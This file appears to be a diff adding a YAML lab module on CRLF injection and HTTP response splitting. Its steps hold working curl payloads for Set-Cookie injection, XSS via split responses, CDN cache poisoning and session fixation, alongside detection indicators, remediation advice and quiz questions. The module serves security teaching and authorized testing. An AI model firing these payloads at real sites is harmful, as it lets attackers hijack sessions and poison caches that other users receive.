@@ -1,0 +1,171 @@
+# Category: Web Application Security - Injection Attacks
+name: "CRLF Injection & HTTP Response Splitting Assessment"
+id: "web-crlf-001"
+category: "offensive_security"
+subcategory: "web_application"
+difficulty: "intermediate"
+estimated_time: "40 minutes"
+
+description: |
+  Identify and exploit Carriage Return Line Feed (CRLF) injection vulnerabilities
+  that enable HTTP response splitting, header injection, cache poisoning, and
+  XSS via malformed HTTP headers. Map findings to OWASP Top 10 A01:2021 and
+  SOC 2 CC6.1 input validation controls.
+
+learning_objectives:
+  - Detect CRLF injection vectors in HTTP headers and parameters
+  - Exploit response splitting to inject malicious headers or body content
+  - Chain CRLF with cache poisoning or XSS for impact escalation
+  - Validate input sanitization and header encoding controls
+
+tools:
+  - burp_suite_community
+  - curl
+  - python_requests
+  - netcat
+  - custom_crlf_scanner
+
+prerequisites:
+  - Target application accepting user input in HTTP headers or redirect parameters
+  - Authorization for HTTP protocol-level security testing
+  - Understanding of HTTP header syntax and CRLF encoding (%0d%0a, \r\n)
+  - Valid authentication token if endpoint requires auth
+
+steps:
+  - id: step1
+    phase: "reconnaissance"
+    action: "Identify potential CRLF injection points"
+    commands:
+      - "# Test redirect parameters for CRLF injection"
+      - "curl -i 'https://[target_url]/redirect?url=https://evil.com%0d%0aSet-Cookie:session=hacked'"
+      - "# Test custom header injection via user input"
+      - "curl -i -H 'X-Forwarded-For: 127.0.0.1%0d%0aX-Injected: test' https://[target_url]/api/user"
+      - "# Test User-Agent header injection"
+      - "curl -i -A 'Mozilla/5.0%0d%0aSet-Cookie:admin=true' https://[target_url]"
+      - "# Scan for parameters that reflect in HTTP headers"
+      - "for param in url next redirect returnto; do curl -s -i \"https://[target_url]/page?$param=test%0d%0aX-Test:injected\" | grep -i 'x-test'; done"
+    expected_output: "HTTP response showing injected headers or split response body"
+    detection: "WAF logs showing %0d%0a or \\r\\n patterns in parameters; unusual header values in access logs"
+
+  - id: step2
+    phase: "enumeration"
+    action: "Validate CRLF encoding bypass techniques"
+    commands:
+      - "# Test URL-encoded CRLF"
+      - "curl -i 'https://[target_url]/redirect?url=%2Fevil.com%0D%0ASet-Cookie:pwned=1'"
+      - "# Test double URL encoding"
+      - "curl -i 'https://[target_url]/redirect?url=%250d%250aSet-Cookie:pwned=1'"
+      - "# Test Unicode CRLF variants"
+      - "curl -i 'https://[target_url]/redirect?url=/evil.com%u000d%u000aSet-Cookie:pwned=1'"
+      - "# Test newline alternatives (LF only, CR only)"
+      - "curl -i 'https://[target_url]/redirect?url=/evil.com%0aSet-Cookie:pwned=1'"
+      - "curl -i 'https://[target_url]/redirect?url=/evil.com%0dSet-Cookie:pwned=1'"
+    expected_output: "Confirmation of which CRLF encodings bypass input filters"
+    compliance_mapping: ["OWASP Top 10 2021-A01", "NIST 800-53 SI-10"]
+
+  - id: step3
+    phase: "exploitation"
+    action: "Exploit HTTP response splitting for header injection"
+    commands:
+      - "# Inject fake Set-Cookie header"
+      - "curl -i 'https://[target_url]/redirect?url=/home%0d%0aSet-Cookie:session=attacker_controlled; Domain=.example.com; Path=/'"
+      - "# Inject cache-control headers for cache poisoning"
+      - "curl -i 'https://[target_url]/api/data?callback=test%0d%0aCache-Control:public,max-age=31536000%0d%0aX-Cache-Poisoned:true'"
+      - "# Test XSS via injected header (if reflected in HTML)"
+      - "curl -i 'https://[target_url]/search?q=test%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>'"
+      - "# Capture full response to verify split"
+      - "curl -s -D /tmp/crlf_response.txt 'https://[target_url]/redirect?url=evil%0d%0aX-Injected:success'"
+      - "cat /tmp/crlf_response.txt | head -30"
+    expected_output: "HTTP response with injected headers or split body content"
+    risk_level: "high"
+    compliance_mapping: ["SOC 2 CC6.1", "PCI DSS v4.0-6.5.10"]
+
+  - id: step4
+    phase: "exploitation"
+    action: "Chain CRLF with cache poisoning or session fixation"
+    commands:
+      - "# Poison cache with injected response"
+      - "curl -i -H 'Host: [target_domain]' 'https://[cdn_endpoint]/api/user?id=123%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:application/json%0d%0a%0d%0a{\"admin\":true}'"
+      - "# Verify poisoned cache is served to other users"
+      - "curl -s 'https://[cdn_endpoint]/api/user?id=123' | jq '.admin'"
+      - "# Attempt session fixation via Set-Cookie injection"
+      - "curl -i -c /tmp/cookies.txt 'https://[target_url]/login?redirect=/home%0d%0aSet-Cookie:PHPSESSID=attacker_session; Path=/'"
+      - "# Use injected session cookie"
+      - "curl -i -b /tmp/cookies.txt 'https://[target_url]/admin/dashboard'"
+    expected_output: "Successful cache poisoning or session takeover via injected headers"
+    detection: "CDN logs showing malformed cache keys; duplicate session IDs from different IPs"
+
+  - id: step5
+    phase: "post_exploitation"
+    action: "Document impact and validate remediation"
+    commands:
+      - "# Export proof-of-concept requests for reporting"
+      - "cat > /tmp/crlf_poc.txt << 'EOF'\nPOST /redirect HTTP/1.1\nHost: [target_domain]\nContent-Type: application/x-www-form-urlencoded\n\nurl=/home%0d%0aSet-Cookie:admin=true\nEOF"
+      - "# Test if input sanitization blocks CRLF after remediation"
+      - "curl -i 'https://[target_url]/redirect?url=test%0d%0aX-Blocked:check' | grep -i 'x-blocked'"
+      - "# Validate header encoding in framework (e.g., Django, Express)"
+      - "# Check framework config: response.headers.set() sanitization"
+    expected_output: "Documented PoC and validation of input sanitization controls"
+    compliance_mapping: ["OWASP ASVS v4.0-V5.1", "SOC 2 CC6.1"]
+
+detection:
+  network_indicators:
+    - "HTTP requests containing %0d%0a, %0D%0A, \\r\\n, or Unicode CRLF in parameters"
+    - "Responses with unexpected duplicate HTTP status lines or header sections"
+    - "Cache requests with anomalous Cache-Control or Vary headers"
+  log_indicators:
+    - "Web server access logs: Parameters containing CR/LF characters"
+    - "Application logs: Header injection attempts in redirect or custom header fields"
+    - "WAF logs: Blocked requests matching CRLF injection rule IDs (e.g., 920270, 920271)"
+  endpoint_indicators:
+    - "Burp Suite Repeater/Intruder testing CRLF payloads"
+    - "Custom scripts iterating over CRLF encoding variants"
+    - "netcat or curl commands with raw header injection attempts"
+
+remediation:
+  immediate:
+    - "Encode or strip CR/LF characters from all user input before including in HTTP headers"
+    - "Use framework-native header methods that auto-encode (e.g., Express res.setHeader(), Django HttpResponse)"
+    - "Validate redirect URLs against allowlist; reject external domains or malformed URLs"
+  long_term:
+    - "Implement WAF rules for CRLF patterns in parameters and headers"
+    - "Add CRLF injection tests to automated DAST/SAST pipelines"
+    - "Conduct secure code review training focused on HTTP header handling"
+    - "Document input validation standards per SOC 2 CC6.1 evidence requirements"
+
+compliance_controls:
+  - standard: "OWASP Top 10 2021"
+    control: "A01:2021-Broken Access Control"
+    description: "Injection flaws including HTTP header manipulation enable unauthorized actions"
+  - standard: "OWASP Application Security Verification Standard v4.0"
+    control: "V5.1"
+    description: "Verify that all input is validated and encoded before use in HTTP headers"
+  - standard: "SOC 2 Type II"
+    control: "CC6.1"
+    description: "Logical access controls include input validation to prevent injection attacks"
+  - standard: "PCI DSS v4.0"
+    control: "6.5.10"
+    description: "Broken authentication and session management via header injection"
+
+variables:
+  target_url: "https://app.example.com"
+  target_domain: "app.example.com"
+  cdn_endpoint: "https://cdn.example.com"
+  user_token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+
+assessment_questions:
+  - "What are the three primary encodings for CRLF characters in HTTP requests?"
+  - "How does HTTP response splitting differ from standard header injection?"
+  - "Which WAF rule IDs in the OWASP Core Rule Set detect CRLF injection?"
+  - "Why is framework-native header handling safer than manual string concatenation?"
+  - "How would you test if a CDN is vulnerable to cache poisoning via CRLF?"
+
+references:
+  - url: "https://owasp.org/www-community/attacks/CRLF_Injection"
+    title: "OWASP CRLF Injection Cheat Sheet"
+  - url: "https://portswigger.net/web-security/request-smuggling"
+    title: "HTTP Request Smuggling and Response Splitting"
+  - url: "https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html"
+    title: "OWASP Input Validation Cheat Sheet"
+  - url: "https://github.com/OWASP/CheatSheetSeries"
+    title: "OWASP Cheat Sheet Series Repository"
